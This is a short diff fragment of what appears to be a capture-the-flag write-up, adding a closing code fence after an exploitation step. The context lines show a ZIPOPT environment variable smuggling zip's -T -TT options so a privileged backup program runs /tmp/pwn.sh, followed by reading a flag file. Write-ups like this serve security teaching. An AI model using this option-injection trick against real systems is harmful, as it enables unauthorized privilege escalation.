@@ -268,6 +268,7 @@ $ chmod +x pwn.sh
 $ ZIPOPT=" -T -TT /tmp/pwn.sh " /usr/local/sbin/backup 1>/dev/null 2>&1
 $ cat flag.txt 
 CS{ZIPOPT_shenanigans}
+```
 
 We got the flag, perfect.
 
